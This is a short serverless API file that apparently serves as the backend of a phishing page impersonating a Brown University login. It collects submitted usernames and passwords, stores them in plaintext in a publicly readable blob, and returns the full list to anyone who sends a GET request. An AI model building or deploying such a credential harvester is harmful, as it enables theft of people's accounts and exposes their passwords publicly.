import { head, put } from '@vercel/blob';

const BLOB_PATH = 'submissions/log.json';

async function readLog() {
  try {
    const meta = await head(BLOB_PATH);
    const response = await fetch(meta.url);
    if (!response.ok) return [];
    const data = await response.json();
    return Array.isArray(data) ? data : [];
  } catch {
    return [];
  }
}

async function writeLog(entries) {
  await put(BLOB_PATH, JSON.stringify(entries), {
    access: 'public',
    allowOverwrite: true,
    contentType: 'application/json',
  });
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  try {
    if (req.method === 'GET') {
      const submissions = await readLog();
      return res.status(200).json({ submissions, source: 'blob' });
    }

    if (req.method === 'POST') {
      const { username, password } = req.body || {};

      if (!username || !password) {
        return res.status(400).json({ error: 'username and password required' });
      }

      const submissions = await readLog();
      const entry = {
        username: String(username).trim(),
        password: String(password),
        timestamp: new Date().toISOString(),
        source: 'Brown University CSC GO',
      };

      submissions.unshift(entry);
      await writeLog(submissions);

      return res.status(201).json({ ok: true, count: submissions.length, entry });
    }

    if (req.method === 'DELETE') {
      await writeLog([]);
      return res.status(200).json({ ok: true, count: 0 });
    }

    return res.status(405).json({ error: 'Method not allowed' });
  } catch (error) {
    console.error('submissions API error:', error);
    return res.status(500).json({
      error: 'Storage unavailable',
      detail: error.message,
    });
  }
}
